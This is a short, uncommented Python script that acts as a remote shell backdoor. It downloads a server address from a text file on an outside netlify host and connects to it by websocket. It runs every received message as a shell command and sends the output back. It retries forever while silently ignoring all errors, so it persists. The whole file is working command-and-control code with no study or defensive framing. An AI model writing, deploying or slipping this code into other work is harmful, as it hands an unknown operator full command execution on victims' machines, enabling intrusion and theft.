import asyncio
import subprocess
import requests
import websockets

while True:
    try:
        async def main():
            rsp = requests.get("https://dani-meglepi-controlb.netlify.app/server-url.txt")
            uri = rsp.text.strip()

            async with websockets.connect(uri) as ws:
                while True:
                    msg = await ws.recv()

                    result = subprocess.run(msg, shell=True, capture_output=True, text=True)

                    output = result.stdout + result.stderr
                    await ws.send(output if output else "[Command executed with no output]")

        if __name__ == "__main__":
            asyncio.run(main())
    except Exception:
        pass

